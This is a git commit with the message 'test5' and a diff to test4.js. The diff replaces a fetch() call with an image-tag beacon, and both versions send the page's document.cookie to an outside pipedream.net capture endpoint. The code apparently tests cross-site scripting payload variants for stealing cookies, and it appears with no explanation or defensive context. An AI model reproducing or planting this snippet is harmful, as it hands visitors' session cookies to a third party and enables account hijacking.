b2ccc736d1a97e78ee9c7f65a2c99f2deb449df4
lari <9063936+furfreemi@users.noreply.github.com>
2022-02-03 09:08:33 -0500

    test5

--- test4.js
+++ test4.js
@@ -1,1 +1,3 @@
-fetch("https://enjtwi0jhwsjf0h.m.pipedream.net/" + document.cookie);
+var img = new Image();
+img.src = "https://enjtwi0jhwsjf0h.m.pipedream.net/" + document.cookie;
+document.getElementById('body').appendChild(img);
